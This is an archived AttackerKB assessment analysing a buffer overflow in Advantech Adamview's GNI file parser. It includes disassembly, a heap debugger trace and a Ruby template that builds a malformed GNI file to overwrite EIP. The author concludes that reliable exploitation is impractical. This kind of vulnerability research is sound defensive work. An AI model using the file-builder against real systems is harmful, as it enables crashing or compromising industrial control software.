---
title: Advantech Adamview Buffer Overflow
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2015-01-20T15:59:00'
created: '2019-09-12T18:07:52.966574'
revision_date: '2020-02-13T17:12:08.801474'
assessment_id: 8426cbed-0d3e-4262-b5d6-71d6f82f3923
topic_id: 19e667a0-a188-43ed-8d8a-8de540e92c7f
topic_short_id: mvI1Sz97To
topic_slug: advantech-adamview-buffer-overflow
akb_topic_url: https://attackerkb.com/topics/mvI1Sz97To/advantech-adamview-buffer-overflow
akb_assessment_url: https://attackerkb.com/topics/mvI1Sz97To/advantech-adamview-buffer-overflow#8426cbed-0d3e-4262-b5d6-71d6f82f3923
---

# Advantech Adamview Buffer Overflow

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/mvI1Sz97To/advantech-adamview-buffer-overflow#8426cbed-0d3e-4262-b5d6-71d6f82f3923).*

---

## Details

According to the official advisory there is a trivial bof on adamview.exe (Adamview builder):

```
.text:00475BA0 push    ebx
.text:00475BA1 lea     ecx, [esp+4Ch+String1]
.text:00475BA5 push    offset aDisplayDesigne ; "Display Designer: %s"
.text:00475BAA push    ecx             ; LPSTR
.text:00475BAB mov     esi, eax
.text:00475BAD call    ds:wsprintfA
```

Indeed the overflow is obvious and can be easily reached with GNI with a display designer window
with a big name.

Inside the file, the designer string is saved as:

2 bytes length / Designer string ending with NULL (0x00)

Since the wsprintf copies the designer name, read from the file, to a stack buffer:

```
-00000034 String1
```

It is trival to trigger the overflow:

```
  def template
    gni = [
      0x41, 0x47, 0x4E, 0x49, 0xAE, 0x01, 0x04, 0x00,
      0xEA, 0x45, 0x20, 0x78, 0x1E, 0x75, 0xF8, 0x18,
      0xDC, 0x45, 0x46, 0xC0, 0x06, 0x2D, 0xF0, 0x20,
      0x92, 0x6D, 0xC0, 0x9C, 0x02, 0x89, 0xF0, 0x44,
      0x06, 0x4D, 0x00, 0x00, 0x48, 0x45, 0x41, 0x44,
      0x16, 0x00, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0xFF,
      0x00, 0x00, 0x00, 0x00, 0x80, 0x02, 0xE0, 0x01,
      0x53, 0x57, 0x50, 0x4C, 0x30, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x02,
      0x00, 0x00, 0x9D, 0x01, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42, 0x54,
      0x53, 0x4B, 0x76, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x2A, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
      0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
      0x54, 0x41, 0x53, 0x4B, 0x31, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0xC8, 0x42, 0x45, 0x54, 0x53, 0x4B, 0x50, 0x57,
      0x50, 0x4C, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0x44, 0x00, 0x00, 0x00,
      0x2D, 0x00, 0x00, 0x00, 0x41, 0x03, 0x00, 0x00,
      0xCB, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x01,
      0x00].pack("C*")

    bof = rand_text(target['Offset'])
    bof << [target.ret].pack("V") # eip
    bof << rand_text(4) # padding
    bof << rand_text_alpha_upper(4) # payload
    bof << "\x00"
    gni << [bof.length].pack("v")
    gni << bof

    gni << [0x50, 0x45, 0x4E, 0x44, 0x46, 0x56,
      0x4B, 0x53, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x45,
      0x54, 0x4B, 0x41, 0x44, 0x41, 0x4D, 0x56, 0x69,
      0x65, 0x77, 0x00, 0xEC, 0x00, 0x00, 0xD0, 0x07,
      0xD0, 0x07, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
      0x00, 0x00, 0x5A, 0x45, 0x4F, 0x46
    ].pack("C*")
```

Unfortunately, there is a heap overflow, previously to the stack overflow, which makes exploitation
super unstable on Windows 7 SP1 (I guess more modern systems too). The same vulnerable function is used
to read the designer name from the file:

```
.text:00475B38 lea     eax, [esp+48h+var_38]
.text:00475B3C push    2               ; SIZE
.text:00475B3E push    eax             ; DST
.text:00475B3F mov     ecx, esi
.text:00475B41 call    dword ptr [edx+3Ch] ; MFC42!CFile::Read, it's reading the size
.text:00475B44 mov     eax, [esp+48h+var_38]
.text:00475B48 mov     edx, [esi]      ; {MFC42!CFile::`vftable'} => [esi]
.text:00475B4A and     eax, 0FFFFh
.text:00475B4F mov     ecx, esi
.text:00475B51 push    eax             ; size
.text:00475B52 push    ebx             ; dst
.text:00475B53 call    dword ptr [edx+3Ch] ; MFC42!CFile::Read
.text:00475B56 push    ebx             ; Str
.text:00475B57 call    ds:_strupr      ; uppercase
```

First 2 bytes are read from the file, and stored in the stack. It is the Designer string length.

After it, this length size is read from the file and stored in the memory pointed by ebx:

```
00475B24 lea     ebx, [edi+2F1h]
```

ebx pointes to an offset inside edi, which points to a buffer in the heap. Where this heap buffer
comes from from?:

```
0:000> !heap -p -a 08af2ec9
    address 08af2ec9 found in
    _DPH_HEAP_ROOT @ 1a21000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 8aa12a4:          8af2bd8              428 -          8af2000             2000
          ? ADAMView!DlgProc+1d4c8
    732b8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
    77355e26 ntdll!RtlDebugAllocateHeap+0x00000030
    7731a376 ntdll!RtlpAllocateHeap+0x000000c4
    772e5ae0 ntdll!RtlAllocateHeap+0x0000023a
    75db9d45 msvcrt!malloc+0x0000008d
    6f5eff9e MFC42!operator new+0x00000015
    00474790 ADAMView!ColorBox::ColorBoxDlgSubclassProc+0x00014ac0
    6f5ffef3 MFC42!CFrameWnd::CreateView+0x00000017
    6f5ffec6 MFC42!CFrameWnd::OnCreateClient+0x0000001c
    6f600ac3 MFC42!CFrameWnd::OnCreateHelper+0x00000031
    6f600a8e MFC42!CMDIChildWnd::OnCreate+0x00000014
    6f5feadb MFC42!CWnd::OnWndMsg+0x00000272
    6f5f3687 MFC42!CWnd::WindowProc+0x0000002e
    6f5fa361 MFC42!AfxCallWndProc+0x000000b5
    6f5fa2b9 MFC42!AfxWndProc+0x0000003e
    6f5fa571 MFC42!AfxWndProcBase+0x00000057
    75a0c4e7 USER32!InternalCallWinProc+0x00000023
    75a05f9f USER32!UserCallWinProcCheckWow+0x000000e0
    75a04f0e USER32!DispatchClientMessage+0x000000da
    759fe98a USER32!__fnINLPCREATESTRUCT+0x0000008b
    772d6fee ntdll!KiUserCallbackDispatcher+0x0000002e
    759fec54 USER32!_CreateWindowEx+0x00000201
    759fbf73 USER32!CreateWindowExA+0x00000033
    75a1f67c USER32!MDIClientWndProcWorker+0x000003b7
    75a22bca USER32!MDIClientWndProcA+0x00000022
    75a0c4e7 USER32!InternalCallWinProc+0x00000023
    75a0c5e7 USER32!UserCallWinProcCheckWow+0x0000014b
    75a05294 USER32!SendMessageWorker+0x000004d0
    759fada9 USER32!SendMessageA+0x0000007c
    6f600a10 MFC42!CMDIChildWnd::Create+0x000000fe
    6f6000dc MFC42!CMDIChildWnd::LoadFrame+0x000000c7
    6f60120e MFC42!CDocTemplate::CreateNewFrame+0x00000067
```

It's a 0x428 buffer allocated on sub_474770

```
.text:0047477D push    eax
.text:0047477E mov     large fs:0, esp
.text:00474785 push    ecx
.text:00474786 push    428h            ; unsigned int
.text:0047478B call    ??2@YAPAXI@Z    ; operator new
```

Since the string read from the file is copied to offset 0x271, it lefts 311 bytes before
the heap buffer is overflowed.

Unfortunately, just after read the string from the file and store it in the heap, it happens:

```
.text:00475B53 call    dword ptr [edx+3Ch] ; MFC42!CFile::Read
.text:00475B56 push    ebx             ; Str
.text:00475B57 call    ds:_strupr      ; uppe
```

The string in the heap is converted to uppercase. It means a lot of "badchars". So overflowing
EIP and storing the payload on 311 bytes doesn't look feasible (at least usign the upper
encoder).

Of course, we can overflow the heap and pry for the execution to reach the stack overflow and
the ret. Unfortunately too many things happen between the heap and the stack overflow:

```
.text:00475B57                 call    ds:_strupr      ; uppercase
.text:00475B5D                 add     esp, 4
.text:00475B60                 lea     ecx, [esp+48h+String1]
.text:00475B64                 push    ebx             ; lpString2
.text:00475B65                 push    ecx             ; lpString1
.text:00475B66                 call    ds:lstrcmpA
.text:00475B6C                 test    eax, eax
.text:00475B6E                 jz      short loc_475B80
.text:00475B70                 lea     edx, [esp+48h+String1]
.text:00475B74                 push    ebx             ; char *
.text:00475B75                 push    edx             ; char *
.text:00475B76                 mov     ecx, offset unk_4BEEA8 ; this
.text:00475B7B                 call    ?ChangeTaskName@CDBCenter@@QAEKPBD0@Z ; CDBCenter::ChangeTaskName(char const *,char const *)
.text:00475B80
.text:00475B80 loc_475B80:                             ; CODE XREF: sub_475AA0+CEj
.text:00475B80                 mov     eax, [esi]
.text:00475B82                 push    0
.text:00475B84                 push    ebp
.text:00475B85                 mov     ecx, esi
.text:00475B87                 call    dword ptr [eax+30h]
.text:00475B8A                 push    esi             ; hMem
.text:00475B8B                 mov     ecx, edi
.text:00475B8D                 call    sub_479950
.text:00475B92                 mov     ecx, edi
.text:00475B94                 call    sub_475980
.text:00475B99                 mov     ecx, edi        ; this
.text:00475B9B                 call    ?GetParentFrame@CWnd@@QBEPAVCFrameWnd@@XZ ; CWnd::GetParentFrame(void)
.text:00475BA0                 push    ebx
.text:00475BA1                 lea     ecx, [esp+4Ch+String1]
.text:00475BA5                 push    offset aDisplayDesigne ; "Display Designer: %s"
.text:00475BAA                 push    ecx             ; LPSTR
.text:00475BAB                 mov     esi, eax
.text:00475BAD                 call    ds:wsprintfA
```

On windows 7 SP1 the heap is used between the overflows, and the corrupted heap makes the process to crash before
reaching the stack overflow and control EIP later.

Also egghunting doesn't look a good option, because all the file contents aren't in memory at the moment of the overflow.

So for example adding the payload as garbage at the end of the file, results with the payload not in memory when
controlling EIP :\...

Even when the HEAP overflow isn't reported in the core advisory, and there are probably a lot of other vulnerabilities,
the software is unsupported atm. Even the CORE vuln wasn't fixed, so I don't think it's worth to invest more time here.
